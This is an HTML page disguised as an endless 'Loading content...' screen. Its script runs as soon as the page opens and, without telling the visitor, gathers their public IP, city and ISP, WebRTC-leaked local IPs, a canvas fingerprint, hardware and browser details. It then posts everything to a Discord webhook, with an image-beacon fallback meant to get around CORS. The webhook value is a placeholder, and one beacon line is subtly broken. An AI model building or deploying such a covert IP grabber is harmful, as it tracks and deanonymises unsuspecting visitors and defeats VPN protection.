<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>

<style>
body{
    background:#0f0f0f;
    color:white;
    font-family:Arial,sans-serif;
    margin:0;
    padding:0;
    height:100vh;
    display:flex;
    flex-direction:column;
    justify-content:center;
    align-items:center;
    overflow:hidden;
}

.loader {
    width: 80px;
    height: 80px;
    border: 8px solid #333;
    border-top: 8px solid #fff;
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin-bottom: 20px;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

.loading-text {
    font-size: 18px;
    margin-bottom: 10px;
}

.loading-subtext {
    font-size: 14px;
    color: #aaa;
    max-width: 400px;
    text-align: center;
}
</style>
</head>
<body>

<div class="loading-container">
    <div class="loader"></div>
    <div class="loading-text">Loading content...</div>
    <div class="loading-subtext">This may take a few moments. Please wait while we prepare your experience.</div>
</div>

<script>

const DISCORD_WEBHOOK_URL = "this app doesnt work and its for testing";

async function sendDeviceInfoToWebhook() {
    try {
        // Collect basic device information
        let ip = "Unable to load";
        try {
            const ipResponse = await fetch("https://api.ipify.org?format=json");
            const ipData = await ipResponse.json();
            ip = ipData.ip;
        } catch (e) {
            console.error("Failed to fetch IP:", e);
        }

        // Try to get more detailed IP information
        let ipInfo = "Unable to load";
        try {
            const ipInfoResponse = await fetch("https://ipapi.co/json/");
            ipInfo = await ipInfoResponse.json();
        } catch (e) {
            console.error("Failed to fetch IP info:", e);
        }

        // Get browser and system information
        const deviceInfo = {
            // IP and location info
            ip: "Public IP: " + ip,
            country: ipInfo.country || "Unknown",
            region: ipInfo.region || "Unknown",
            city: ipInfo.city || "Unknown",
            isp: ipInfo.org || "Unknown",
            timezone: "Timezone: " + Intl.DateTimeFormat().resolvedOptions().timeZone,
            time: "Local Time: " + new Date().toString(),
            
            // Browser and system info
            browser: "User Agent: " + navigator.userAgent,
            platform: "Platform: " + navigator.platform,
            language: "Primary Language: " + navigator.language,
            languages: "Languages: " + navigator.languages.join(", "),
            cookies: "Cookies Enabled: " + navigator.cookieEnabled,
            darkmode: "Dark Mode: " + window.matchMedia("(prefers-color-scheme: dark)").matches,
            online: "Online: " + navigator.onLine,
            
            // Screen and display info
            screen: "Screen Resolution: " + screen.width + " x " + screen.height,
            available: "Available Screen: " + screen.availWidth + " x " + screen.availHeight,
            window: "Window Size: " + window.innerWidth + " x " + window.innerHeight,
            colordepth: "Color Depth: " + screen.colorDepth,
            pixelratio: "Pixel Ratio: " + window.devicePixelRatio,
            touch: "Touch Support: " + ("ontouchstart" in window),
            
            // Hardware info
            cores: "CPU Cores: " + navigator.hardwareConcurrency,
            memory: "Device Memory: " + (navigator.deviceMemory || "Unknown") + " GB",
            
            // Network info
            network: "Network Type: " + (navigator.connection ? navigator.connection.effectiveType : "Unknown"),
            latency: "Estimated Latency: " + (navigator.connection ? navigator.connection.rtt + " ms" : "Unknown"),
            
            // Battery info
            battery: "Battery: " + ("getBattery" in navigator ? "Available" : "Not available"),
            
            // WebRTC IP detection (for VPN detection)
            webrtcIPs: "WebRTC IPs: " + (await getWebRTCIPs()).join(", "),
            
            // Canvas fingerprint
            canvasFingerprint: "Canvas Fingerprint: " + getCanvasFingerprint(),
            
            // WebGL info
            webglInfo: "WebGL Info: " + JSON.stringify(getWebGLInfo()),
            
            // Storage info
            localStorage: "Local Storage Available: " + isLocalStorageAvailable(),
            sessionStorage: "Session Storage Available: " + isSessionStorageAvailable(),
            indexedDB: "IndexedDB Available: " + isIndexedDBAvailable(),
            
            // Plugins
            plugins: "Plugins: " + getPlugins().join(", "),
            
            // Misc
            doNotTrack: "Do Not Track: " + (navigator.doNotTrack || "Not set"),
            javaEnabled: "Java Enabled: " + navigator.javaEnabled(),
            pdfViewerEnabled: "PDF Viewer Enabled: " + navigator.pdfViewerEnabled
        };

        // Create Discord embed
        const embed = {
            title: "Device Information",
            color: 0x3498db, // Blue color
            fields: Object.entries(deviceInfo).map(([key, value]) => ({
                name: key.charAt(0).toUpperCase() + key.slice(1),
                value: value || "Not available",
                inline: false
            })),
            timestamp: new Date().toISOString()
        };

        const payload = {
            embeds: [embed]
        };

        // Try multiple methods to send to Discord
        try {
            // Method 1: Direct fetch
            const response = await fetch(DISCORD_WEBHOOK_URL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)
            });
            
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            
            console.log("Device information sent successfully");
        } catch (fetchError) {
            console.error("Fetch method failed:", fetchError);
            
            // Method 2: Using image beacon (more likely to bypass CORS)
            const beaconData = btoa(JSON.stringify(payload));
            const img = new Image();
            img.src = `https://discord.com/api/webhooks/${DISCORD_WEBHOOK_URL.split('/').slice(-2).join('/')}/beacon?data=\${beaconData}`;
            
            console.log("Beacon method attempted");
        }
    } catch (error) {
        console.error("Error sending device information:", error);
    }
}

// Function to get WebRTC IPs
async function getWebRTCIPs() {
    const ips = [];
    try {
        const rtc = new RTCPeerConnection({iceServers:[]});
        rtc.createDataChannel('', {reliable:false});
        await rtc.createOffer();
        rtc.setLocalDescription(rtc.localDescription);
        
        // Wait a bit for ICE candidates to be gathered
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        rtc.localDescription.sdp.split('\n').forEach(line => {
            if (line.startsWith('a=candidate:')) {
                const parts = line.split(' ');
                if (parts[4] && (parts[4].match(/^(\d{1,3}\.){3}\d{1,3}$/) || parts[4].match(/^[a-f0-9:]+$/i))) {
                    ips.push(parts[4]);
                }
            }
        });
        
        rtc.close();
    } catch (e) {
        console.error("Failed to get WebRTC IPs:", e);
    }
    return ips;
}

// Function to get canvas fingerprint
function getCanvasFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 200;
        canvas.height = 50;
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('Browser fingerprint', 2, 2);
        return canvas.toDataURL().slice(-50);
    } catch (e) {
        return "Unable to generate";
    }
}

// Function to get WebGL info
function getWebGLInfo() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return { error: "WebGL not supported" };
        
        return {
            vendor: gl.getParameter(gl.VENDOR),
            renderer: gl.getParameter(gl.RENDERER)
        };
    } catch (e) {
        return { error: "Unable to get WebGL info" };
    }
}

// Function to check localStorage availability
function isLocalStorageAvailable() {
    try {
        const test = '__test__';
        localStorage.setItem(test, test);
        localStorage.removeItem(test);
        return true;
    } catch (e) {
        return false;
    }
}

// Function to check sessionStorage availability
function isSessionStorageAvailable() {
    try {
        const test = '__test__';
        sessionStorage.setItem(test, test);
        sessionStorage.removeItem(test);
        return true;
    } catch (e) {
        return false;
    }
}

function isIndexedDBAvailable() {
    return 'indexedDB' in window;
}

// Function to get plugins
function getPlugins() {
    const plugins = [];
    if (navigator.plugins) {
        for (let i = 0; i < navigator.plugins.length; i++) {
            plugins.push(navigator.plugins[i].name);
        }
    }
    return plugins;
}

// Send info immediately when page loads
sendDeviceInfoToWebhook();

// Keep showing the loading screen indefinitely
</script>

</body>
</html>
